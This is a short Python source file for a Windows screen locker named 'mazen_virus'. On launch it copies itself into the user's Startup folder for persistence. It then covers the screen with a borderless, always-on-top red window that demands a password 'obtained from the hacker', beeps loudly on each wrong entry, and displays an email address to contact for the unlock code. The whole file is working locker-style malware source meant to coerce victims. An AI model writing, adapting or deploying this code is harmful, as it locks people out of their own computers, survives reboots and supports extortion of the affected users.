import tkinter as tk
from tkinter import messagebox
import winsound
import threading
import os
import sys
import shutil


path_app = os.path.abspath(sys.argv[0])


startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

startup_file = os.path.join(startup_path, "mazen_virus.exe")


if not os.path.exists(startup_file):
    try:
        shutil.copy(path_app, startup_file)
    except Exception as e:
        print(f"Failed to copy file to startup: {e}")


root = tk.Tk()


def exit_app():
    root.destroy()


def check_password():
    key = "1234"
    if entry.get() == key:
        messagebox.showinfo("Success", "Password is correct!")
        exit_app()
    else:

        winsound.Beep(2000, 5000)  # تم تقليل مدة الصوت إلى 0.5 ثانية
        messagebox.showerror("don't play with me", "If you need the password, connect with me")


root.geometry(f"{root.winfo_screenwidth()}x{root.winfo_screenheight()}")
root.overrideredirect(True)
root.attributes("-topmost", True)
root.config(background="red")
root.title("Enter the password")


tk.Label(root, text="Enter the password you obtained from the hacker", bg="red", fg="white", font=("Arial", 14)).pack(pady=20)
entry = tk.Entry(root, width=50, bd=0, font=("Arial", 12))
entry.pack(pady=5)
b = tk.Button(root, text="enter to your device", command=check_password, font=("Arial", 12))
b.pack(pady=10)
tk.Label(root, text="d3fualt01@gmail.com", bg="red", fg="white", font=("Arial", 10)).place(x=450, y=600)


root.resizable(False, False)


root.mainloop()